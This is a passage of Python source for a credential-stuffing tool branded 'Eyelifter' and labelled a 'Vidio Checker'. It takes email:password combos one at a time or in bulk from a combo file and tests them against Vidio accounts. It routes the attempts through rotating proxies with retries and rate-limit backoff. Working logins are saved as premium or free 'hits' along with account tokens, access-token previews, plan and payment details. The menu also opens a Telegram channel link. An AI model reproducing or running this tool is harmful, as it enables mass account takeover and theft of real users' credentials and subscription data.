    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "PREMIUM" if result["status"] == "hit" else "FREE"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("UID", str(u.get("uid", "-"))),
            ("Plenty ID", str(u.get("plenty_id", "-"))),
            ("x_user_token", u.get("x_user_token", "-")),
            ("Masked ID", u.get("masked_id", "-")),
            ("Plan", u.get("plan", "-")),
            ("Plan Type", u.get("plan_type", "-")),
            ("Plan Status", u.get("plan_status", "-")),
            ("Price", u.get("price", "-")),
            ("Product", u.get("product", "-")),
            ("Started", u.get("started_at", "-")),
            ("Expires", u.get("expires_at", "-")),
            ("Days Left", str(u.get("days_left", 0))),
            ("Auto Renew", u.get("auto_renew", "-")),
            ("Payment", u.get("payment", "-")),
            ("Subscriptions", str(u.get("sub_count", 0))),
            ("Included", u.get("included", "-") or "-"),
            ("Access Token", (u.get("access_token_preview") or "-")[:60]),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "vidio_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "vidio_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "vidio_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "vidio_errors.txt"), "w", encoding="utf-8")

    header = (f"# Vidio Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad_proxies = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("vidio_hits.txt", "hits"),
        ("vidio_free.txt", "free"),
        ("vidio_bad.txt", "bad"),
        ("vidio_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (premium)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Auto Logout:        {CONFIG['auto_logout']}")
    print(f"  [11] Debug:              {CONFIG['debug']}")
    print(f"  [12] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(100, int(input("Threads (1-100): "))))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            CONFIG["auto_logout"] = not CONFIG["auto_logout"]
            _loader.settings["auto_logout"] = CONFIG["auto_logout"]
            changed = True
        elif ch == "11":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]
            changed = True
        elif ch == "12":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Vidio Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)